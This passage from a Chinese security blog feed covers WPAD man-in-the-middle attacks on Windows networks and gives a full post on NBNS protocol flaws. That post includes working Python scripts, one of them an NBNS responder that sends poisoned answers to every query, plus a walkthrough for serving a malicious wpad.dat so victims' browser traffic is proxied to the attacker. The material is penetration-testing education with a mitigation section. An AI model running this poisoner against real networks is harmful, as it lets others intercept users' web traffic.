title="0x05 WPAD 内网渗透深入研究"></a>0x05 WPAD 内网渗透深入研究</h2><ul><li><p>利用 NetBIOS 名称解析进行基于 WPAD 的中间人攻击</p><p>见 <em>利用 NBNS 协议缺陷进行 WPAD 中间人攻击</em></p></li><li><p>利用 LLLMNR 名称解析缺陷进行基于 WPAD 的中间人攻击</p><p>见 <em>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</em></p></li><li><p>利用 DHCP 本地网络进行基于 WPAD 的中间人攻击</p><p>在本地网络中，攻击者可以通过 ARP 欺骗等方式伪装成 DHCP 服务器，然后在 DHCP 响应包的 DHCP 252 选项中提供一个恶意 PAC 文件所在的 URL。</p></li><li><p>通过特权地位（privileged position）和 DNS 进行远程攻击</p><p>除了本地网络攻击外，WPAD 攻击也可能通过外部 DNS 查询发生。由于许多用户将他们的计算机配置了公共的 DNS 服务器（如 8.8.8.8、8.8.4.4、208.67.222.222 和 208.67.220.220）来执行 DNS 域名解析，在这种情况下，用户机器会发送 DNS 查询（如 wpad.local）到本地网络之外的服务器，处于网络特权位置的攻击者（例如网关或任何其他上游主机）可以监视 DNS 查询并伪造应答，从而指示客户端下载并执行恶意的 PAC 文件。</p></li><li><p>通过恶意的 wpad.tld 远程访问 Internet</p><p>WPAD 的特殊之处在于会递归地遍历本地机器名称以查找要查询的域，如果一台机器被称为“laptop01.us.division.company.com”，则按照以下方式查询以下域名：</p><blockquote><ol><li>wpad.us.division.company.com</li><li>wpad.division.company.com</li><li>wpad.company.com</li><li>wpad.com</li></ol></blockquote><p>利用这个漏洞，攻击者可以通过恶意的 wpad.tld 域名，将用户的浏览器指向自己的代理，拦截并修改所有的 HTTP 流量。</p></li></ul><h2 id="0x06-威胁实例-——-Flame-病毒"><a href="#0x06-威胁实例-——-Flame-病毒" class="headerlink" title="0x06 威胁实例 —— Flame 病毒"></a>0x06 威胁实例 —— Flame 病毒</h2><p><strong>超级火焰（Flame）病毒利用 WPAD 进行中间人攻击</strong>，其工作模式如下：</p><ul><li><p><strong>SNACK：NetBIOS 名称服务器欺骗（NBNS spoofing）</strong></p><p>SNACK 模块会为所有网络接口或预设网络接口创建一个 RAW 网络套接字，并监听当前网络接收所有的网络数据包，如果收到了 NBNS 查询会将其写入加密的日志文件中（“%windir%\temp~DEB93D.tmp”），当 NBNS 查询请求中包含<strong>“WPAD”</strong>或<strong>“MSHOME-F3BE293C”</strong> 字符，立即伪造 NBNS 响应，返回自己的 IP 地址。</p></li><li><p><strong>MUNCH：代理检测欺骗和 Windows 更新请求欺骗（Spoofing proxy detection and Windows Update request）</strong></p><p>“MUNCH”是 FlameHTTP 服务器模块的名称，用于提供 WPAD 服务，它会收到来自受感染计算机中的 SNACK 提供的 IP 地址，并通过由 MUNCH 提供的 “wpad.dat” 文件将受感染计算机用作代理服务器。当其成功作为被攻击主机的代理后，会劫持特定的 Windows 更新请求到 MUNCH 服务器，并提供带有后门的 Windows 更新文件给受害者下载。</p></li></ul><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>在利用 WPAD 进行攻击时，实际的效果很可能没有想象的那么好，不过一旦奏效，就可以拿到受害者主机权限。在很多内网中，管理员不会对这些攻击方式做防御措施，除了部分桌面安全产品，如防火墙可能会做严格的过滤拦截，大部分情况下，此类攻击方式还是很有效的。尤其是可以在做名称解析响应时，可以筛选受害者主机，对  HTTP 数据包进行更改插入恶意代码，进行针对性的定点打击。</p><h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>对于 WPAD 攻击，<strong>唯一</strong> 能够阻止这类漏洞的方法就是完全禁用 WinHttpAutoProxySvc 服务。有时由于其他服务依赖 WPAD，所以在“服务”设置中无法禁用它（选项变灰），但可以通过修改相应的注册表项来完成：</p><blockquote><p>在注册表 “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc” 位置下，将 “Start” 的值从3（手动）更改为4（禁用）。</p></blockquote><p><strong>参考文章：</strong><br><a href="https://xz.aliyun.com/t/1739">https://xz.aliyun.com/t/1739</a><br><a href="https://www.cnblogs.com/studyskill/p/8532566.html">https://www.cnblogs.com/studyskill/p/8532566.html</a><br><a href="https://blog.csdn.net/zy_strive_2012/article/details/53196482">https://blog.csdn.net/zy_strive_2012/article/details/53196482</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Windows</tag>
      
      <tag>WPAD</tag>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 NBNS 协议缺陷进行 WPAD 中间人攻击</title>
    <link href="/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <url>/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>本文阐述了 NetBIOS 框架下的相关协议的区别， 重点对 NBNS 协议进行了分析，同时提出了针对 NBNS 协议缺陷进行 WPAD 中间人攻击的思路。</p><h2 id="0x00-NetBIOS-相关协议"><a href="#0x00-NetBIOS-相关协议" class="headerlink" title="0x00 NetBIOS 相关协议"></a>0x00 NetBIOS 相关协议</h2><p><strong>NetBIOS（Network Basic Input/Output System，网络基本输入输出系统）</strong>，一般指用于局域网通信的一套 <strong>API</strong>（严格的说 NetBIOS 并不是一个网络协议），提供了一种允许局域网内不同电脑能够建立和使用连接服务的功能。</p><p><strong>NetBEUI（NetBIOS Enhanced User Interface，NetBIOS 增强用户接口）</strong>，可以看作是 NetBIOS 协议的 <strong>扩展</strong> 版本，主要用于小型局域网中的主机通信，目前基本已经淘汰。</p><blockquote><p>注：NetBIOS 和 NetBEUI，都是基于以太网广播的，也就是只能识别 MAC 地址，没有更高层的协议头部（如 IP、TCP/UDP），所以是无法通过路由器的。</p></blockquote><p><strong>NBT（NetBIOS over TCP/IP，简称 NBT 或者 NetBT）</strong>，是一个网络协议，允许以前使用 NetBIOS API 的应用程序能够在 TCP/IP 协议栈中使用。如今，NBT 已经逐渐地 <strong>代替</strong> NetBIOS 成为主流协议，因为它不仅适用于以太网，更适用于现代的 TCP/IP 网络。</p><blockquote><p><em>Wireshark</em> 中是这样解释的：<em>NetBIOS over TCP/IP (also called NBT) seems to slowly supersede all the other NetBIOS variants.</em></p><p>译：NetBIOS over TCP/IP 也叫做 NBT，已经逐渐淘汰并取代其他的 NetBIOS 变形协议或扩展协议。</p></blockquote><p>NetBIOS 和 NBT 的具体关系如图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/382300-20160109151303168-1561702700.gif" alt="NetBIOS over TCP/IP 协议栈"></p><p>如上图所示，<strong>NBT 是一个框架</strong>，提供了三种不同的服务，即 <strong>NBNS、NBDS、NBSS</strong> 三个协议。</p><blockquote><p>注：在使用 Wireshark 等抓包工具来捕获数据包时，是抓不到 NBT 协议的数据包的，只能抓到 NBNS、NBDS、NBSS 这三种协议的数据包。</p></blockquote><p>协议的具体描述如下：</p><ul><li><p><strong>NBNS（NetBIOS Name Service，NetBIOS 名称服务器）</strong>，类似于 DNS 服务，使用 UDP/137 或 TCP/137 端口，在基于 NetBIOS 名称访问的网络上提供名称注册和名称解析服务，<strong>通常也被称为 NBT-NS</strong>。关闭 137 端口，则无法使用 WINS 服务。</p><blockquote><p>Microsoft 的 NBNS 实现称为 WINS（Windows Internet Name Service，Windows 网络名称服务）</p></blockquote></li><li><p><strong>NBDS（NetBIOS Datagram Service，NetBIOS 数据报服务器）</strong>，使用 UDP/138 端口，主要用于提供 NetBIOS 环境下的计算机名浏览功能，很少使用。</p><blockquote><p>如果非法入侵者可以与目标主机的 138 端口建立连接请求，就能轻易获得目标主机所处的局域网网络名称以及目标主机的计算机名称。</p></blockquote></li><li><p><strong>NBSS（NetBIOS Session Service，NetBIOS 会话服务器）</strong>，使用 TCP/139 端口建立可靠的、基于连接的通信，主要用于 <em>Windows 文件和打印机共享</em> 和 <em>Linux Samba 服务</em>。关闭 139 端口，则无法在 PC 间共享文件和打印机。</p></li></ul><p><strong>SMB（Server Message Block，服务器信息块）</strong>，是一个应用层的协议，主要用于提供网络中文件共享、文件打印和进程间通信等功能，如今 SMB 主要使用于 Windows 系统中。</p><p>SMB 协议有两种运行方式，第一种通过 NetBIOS API，使用的是 UDP/137 和 UDP/138 端口以及 TCP/137 和 TCP/139 端口，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/382300-20160109151306934-1336561833.gif" alt="使用 NetBIOS 实现的 SMB"></p><p>第二种是直接运行在 TCP 和 UDP 协议之上，使用的是 <strong>445</strong> 端口，也被称为*”Direct hosting of SMB over TCP/IP”*。</p><blockquote><p>默认 Windows 系统都支持 SMB 协议，Linux 系统没有相关组件，需要使用 Samba 服务实现 SMB 协议。</p></blockquote><h2 id="0x01-NBNS-协议分析"><a href="#0x01-NBNS-协议分析" class="headerlink" title="0x01 NBNS 协议分析"></a>0x01 NBNS 协议分析</h2><p>NetBIOS 协议的概念定义在 <a href="https://tools.ietf.org/html/rfc1001">RFC 1001</a> 中、实现细节定义在 <a href="https://tools.ietf.org/html/rfc1002">RFC 1002</a> 中，文档里详细的介绍了有关于 NetBIOS、NBNS 协议的结构，配置以及安全性等内容。</p><p><strong>NBNS 的协议结构如下图所示：</strong></p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562904209741.png" alt="NBNS 协议结构"></p><p>NBNS 的协议结构与 LLMNR 基本一致，可以参考 <em>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</em> 中对 LLMNR 协议的解析。不同之处在于 NBNS 协议中的主机名称是经过 <strong>编码</strong> 的，而 LLMNR 中是以明文传递，在 Python 的 dpkt 库中有实现其编码和解码的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">name</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>l = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>    c = <span class="hljs-built_in">ord</span>(c)<br>    l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>    l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">nbname</span>):</span><br><span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>    <span class="hljs-keyword">return</span> nbname<br>l = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>    l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                 ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>使用 Wireshark 可以快速抓取到 NBNS 协议的数据包，如下图：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/1562905742768.png" alt="经过编码后的主机名称"></p><h2 id="0x02-NBNS-名称解析过程"><a href="#0x02-NBNS-名称解析过程" class="headerlink" title="0x02 NBNS 名称解析过程"></a>0x02 NBNS 名称解析过程</h2><p>NBNS 名称解析的具体过程可以查看 <em>Windows 名称解析机制探究及缺陷利用</em>，一种常见的名称解析过程及利用如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/20171207135158-bd391ebe.png" alt="NetBIOS 名称解析过程"></p><h2 id="0x03-Python-实现-NetBIOS-协议的质询与应答"><a href="#0x03-Python-实现-NetBIOS-协议的质询与应答" class="headerlink" title="0x03 Python 实现 NetBIOS 协议的质询与应答"></a>0x03 Python 实现 NetBIOS 协议的质询与应答</h2><p>NBNS 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;192.168.16.255&#x27;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nqs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x01\x10&quot;</span>  <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question:1</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>      <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>  <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;32s&quot;</span>, self.encode_name(self.name)))<br><br>    <span class="hljs-comment"># From http://code.google.com/p/dpkt/</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_name</span>(<span class="hljs-params">self,name</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level encoded name.&quot;&quot;&quot;</span><br>        l = []<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> struct.pack(<span class="hljs-string">&#x27;16s&#x27;</span>, name):<br>            c = <span class="hljs-built_in">ord</span>(c)<br>            l.append(<span class="hljs-built_in">chr</span>((c &gt;&gt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x41</span>))<br>            l.append(<span class="hljs-built_in">chr</span>((c &amp; <span class="hljs-number">0xf</span>) + <span class="hljs-number">0x41</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;NBNS Querying... -&gt; %s&quot;</span> % self.name<br>            self.nqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.nqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Query(<span class="hljs-string">&quot;WPAD&quot;</span>)<br>    nbns.Query()<br></code></pre></td></tr></table></figure><p>NBNS 应答数据包的具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket, struct,binascii<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NBNS_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.nas = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>        <span class="hljs-string">&quot;TID&quot;</span>              <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x85\x00&quot;</span>         <span class="hljs-comment"># Flags Query</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x20&quot;</span>             <span class="hljs-comment"># length of Name:32</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>             <span class="hljs-comment"># Name   </span><br>        <span class="hljs-string">&quot;\x00&quot;</span>             <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x20&quot;</span>         <span class="hljs-comment"># Query Type:NB</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>         <span class="hljs-comment"># Class</span><br>        <span class="hljs-string">&quot;\x00\x00\x00\xa5&quot;</span> <span class="hljs-comment"># TTL</span><br>        <span class="hljs-string">&quot;\x00\x06&quot;</span>         <span class="hljs-comment">#</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>         <span class="hljs-comment"># Null</span><br>        <span class="hljs-string">&quot;IPADDR&quot;</span>)          <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">137</span><br>        self.nas.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.nas.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_name</span>(<span class="hljs-params">self, nbname</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;Return the NetBIOS first-level decoded nbname.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(nbname) != <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> nbname<br>        l = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>):<br>            l.append(<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(nbname[i]) - <span class="hljs-number">0x41</span>) &lt;&lt; <span class="hljs-number">4</span>) |<br>                         ((<span class="hljs-built_in">ord</span>(nbname[i+<span class="hljs-number">1</span>]) - <span class="hljs-number">0x41</span>) &amp; <span class="hljs-number">0xf</span>)))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(l).split(<span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.nas.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            data, addr = self.nas.recvfrom(<span class="hljs-number">1024</span>)<br>            tid  = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]           <br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">45</span>]<br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % (self.IPADDR, addr[<span class="hljs-number">0</span>], self.decode_name(name))<br>            self.nas.sendto(data, addr)<br>        self.nas.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    nbns = NBNS_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    nbns.Answser()<br></code></pre></td></tr></table></figure><h2 id="0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析"><a href="#0x04-利用-NBNS-名称解析进行基于-WPAD-的中间人攻击思路解析" class="headerlink" title="0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析"></a>0x04 利用 NBNS 名称解析进行基于 WPAD 的中间人攻击思路解析</h2><p>利用 NBNS 名称解析进行基于 WPAD 的中间人攻击本质上还是利用了 Windows 系统的名称解析顺序和 NBNS 协议的缺陷。结合 <em>WPAD 协议分析及内网渗透利用</em> 所述，在工作组环境中，客户端主机执行 WPAD 功能时，会遵循 Windows 系统的名称解析顺序，查询的名称均为 <strong>WPAD</strong>。那么，我们先广播进行“WPAD”名称的注册，然后监听 137 端口（如图5），等待局域网其他已启用 WPAD 功能的主机使用 IE 浏览器连接网络时，即可将受害者主机的浏览器代理设置为攻击者指定的代理服务器，之后就可以获得受害者的浏览器的上网记录。</p><p>我们模拟出一个简单的攻击场景，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/20171207135331-f46fc93c.png" alt="利用 NBNS 名称解析进行基于 WPAD 的中间人攻击 "></p><p>攻击者开启 NetBIOS 恶意应答程序，并监听 80 端口提供恶意 PAC 配置文件（wpad.dat）的下载，同时开启代理服务器（这里使用的是 Burp Suite HTTP 代理服务器）；</p><p>受害者主机（Windows XP） 打开利用 NBNS 名称解析进行基于 WPAD 的中间人攻击  IE 浏览器（已启用 WPAD  功能）开始上网，此时浏览器就会寻找当前局域网中的代理服务器，实际上是进行了 WPAD 的名称查询，可以从图中看到攻击者的恶意应答程序做了恶意响应，同时提供 PAC 配置文件下载的 HTTP 服务器打印出了日志信息，表明此时受害者的浏览器已经下载了恶意 PAC 配置文件（该文件内容为代理服务器地址信息）；</p><p>之后，从 Burp Suite 中可以看到，受害者的浏览器使用了攻击者指定的代理服务器进行上网。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>利用 NetBIOS 域名解析协议进行中间人攻击的方式还有很多，关于 NetBIOS 协议的内容可以在相关的 RFC 文档中查阅，其中还有不少东西可以在内网渗透中利用到，如 OPCODE 字段的取值、BROWSER 协议等等，不论是攻击还是防御都需要进一步的研究。</p><p><strong>参考文章：</strong><br><a href="https://xz.aliyun.com/t/1739">https://xz.aliyun.com/t/1739</a><br><a href="https://blog.sina.com.cn/s/blog_614f473101017e10.html">https://blog.sina.com.cn/s/blog_614f473101017e10.html</a><br><a href="https://www.cnblogs.com/wangaohui/p/5116519.html">https://www.cnblogs.com/wangaohui/p/5116519.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Windows</tag>
      
      <tag>WPAD</tag>
      
      <tag>NetBIOS</tag>
      
      <tag>NBNS</tag>
      
      <tag>中间人攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</title>
    <link href="/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/"/>
